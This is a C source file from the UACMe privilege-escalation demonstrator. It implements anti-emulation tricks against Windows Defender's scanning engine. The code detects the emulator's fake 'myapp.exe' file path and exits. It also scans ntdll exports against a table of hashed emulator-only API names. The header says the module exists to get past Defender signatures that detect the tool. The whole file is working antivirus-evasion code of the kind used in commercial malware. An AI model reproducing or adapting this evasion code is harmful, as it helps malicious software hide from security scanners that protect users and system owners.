/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2018
*
*  TITLE:       WINDEFEND.C
*
*  VERSION:     2.89
*
*  DATE:        14 Jun 2018
*
*  MSE / Windows Defender anti-emulation part.
*
*  Short FAQ:
*
*  Q: Why this module included in UACMe, 
*     I thought this is demonstrator tool not real malware?
*
*  A: WinDefender is a default AV software installed on every Windows
*     since Windows 8. Because some of the lazy malware authors copy-pasted
*     whole UACMe project in their crappiest malware WinDefender has
*     several signatures to detect UACMe and it components.
*     Example of WinDefend signature: Bampeass. We cannot be prevented by this
*     as this demonstrator must be running on newest Windows OS versions.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "shared.h"

/*
* wdCheckEmulatedVFS
*
* Purpose:
*
* Detect Microsoft Security Engine emulation by it own VFS artefact.
*
* Microsoft AV provides special emulated environment for scanned application where it
* fakes general system information, process environment structures/data to make sure
* API calls are transparent for scanned code. It also use simple Virtual File System
* allowing this AV track file system changes and if needed continue emulation on new target.
*
* This method implemented in commercial malware presumable since 2013.
*
*/
VOID wdCheckEmulatedVFS(
    VOID
)
{
    WCHAR szBuffer[MAX_PATH];
    WCHAR szMsEngVFS[12] = { L':', L'\\', L'm', L'y', L'a', L'p', L'p', L'.', L'e', L'x', L'e', 0 };

    RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
    GetModuleFileName(NULL, szBuffer, MAX_PATH);
    if (_strstri(szBuffer, szMsEngVFS) != NULL) {
        ExitProcess((UINT)0);
    }
}


/*
* wdDummyWindowProc
*
* Purpose:
*
* Part of antiemulation, does nothing, serves as a window for ogl operations.
*
*/
LRESULT CALLBACK wdDummyWindowProc(
    HWND hwnd,
    UINT uMsg,
    WPARAM wParam,
    LPARAM lParam
)
{
    switch (uMsg) {
    case WM_CLOSE:
        PostQuitMessage(0);
        break;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

#define WD_HASH_TABLE_ITEMS 21

DWORD wdEmulatorAPIHashTable[] = {
    0x3E3CBE69, //VFS_CopyFile
    0x00633A7F, //VFS_DeleteFile
    0x331245AB, //VFS_DeleteFileByHandle
    0xE0A858CF, //VFS_FileExists
    0xDC54FFE2, //VFS_FindClose
    0x1C920626, //VFS_FindFirstFile
    0xAA3ABE29, //VFS_FindNextFile
    0xBAC05205, //VFS_FlushViewOfFile
    0xDB9EFF5A, //VFS_GetAttrib
    0xDBB23222, //VFS_GetHandle
    0xDBA02E4A, //VFS_GetLength
    0xEB0B0115, //VFS_MapViewOfFile
    0x302ABE69, //VFS_MoveFile
    0x5F831879, //VFS_Open
    0x5F82E329, //VFS_Read
    0x7B9EFF5A, //VFS_SetAttrib
    0x5DC47852, //VFS_SetCurrentDir
    0x7BA02E4A, //VFS_SetLength
    0xBAC23515, //VFS_UnmapViewOfFile
    0xFC14FE63, //VFS_Write
    0xD4908D6E  //NtControlChannel
};

/*
* wdGetHashForString
*
* Purpose:
*
* Calculates specific hash for string.
*
*/
DWORD wdxGetHashForString(
    _In_ char *s
)
{
    DWORD h = 0;

    while (*s != 0) {
        h ^= *s;
        h = RotateLeft32(h, 3) + 1;
        s++;
    }

    return h;
}

/*
* wdIsEmulatorPresent
*
* Purpose:
*
* Detect MS emulator state.
*
*/
NTSTATUS wdIsEmulatorPresent(
    VOID)
{
    PCHAR ImageBase = NULL;

    PIMAGE_DOS_HEADER dosh;
    PIMAGE_FILE_HEADER fileh;
    PIMAGE_OPTIONAL_HEADER64 popth64;
    PIMAGE_OPTIONAL_HEADER32 popth32;
    PIMAGE_EXPORT_DIRECTORY pexp;
    PDWORD names;

    DWORD ETableVA = 0;
    ULONG i, c, Hash;

    STATIC_UNICODE_STRING(uNtdll, L"ntdll.dll");

    if (!NT_SUCCESS(LdrGetDllHandle(NULL, NULL, &uNtdll, &ImageBase)))
        return STATUS_DLL_NOT_FOUND;

    dosh = (PIMAGE_DOS_HEADER)ImageBase;
    fileh = (PIMAGE_FILE_HEADER)((PBYTE)dosh + sizeof(DWORD) + dosh->e_lfanew);
    popth32 = (PIMAGE_OPTIONAL_HEADER32)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
    popth64 = (PIMAGE_OPTIONAL_HEADER64)popth32;

    if (fileh->Machine == IMAGE_FILE_MACHINE_AMD64) {
        ETableVA = popth64->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    }
    else
        if (fileh->Machine == IMAGE_FILE_MACHINE_I386) {
            ETableVA = popth32->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        }

    if (ETableVA == 0)
        return STATUS_INVALID_IMAGE_FORMAT;

    pexp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dosh + ETableVA);
    names = (PDWORD)((PBYTE)dosh + pexp->AddressOfNames);

    for (i = 0; i < pexp->NumberOfNames; i++) {
        Hash = wdxGetHashForString((char *)((PBYTE)dosh + names[i]));
        for (c = 0; c < WD_HASH_TABLE_ITEMS; c++) {
            if (Hash == wdEmulatorAPIHashTable[c])
                return STATUS_NEEDS_REMEDIATION;
        }
    }

    return STATUS_NOT_SUPPORTED;
}
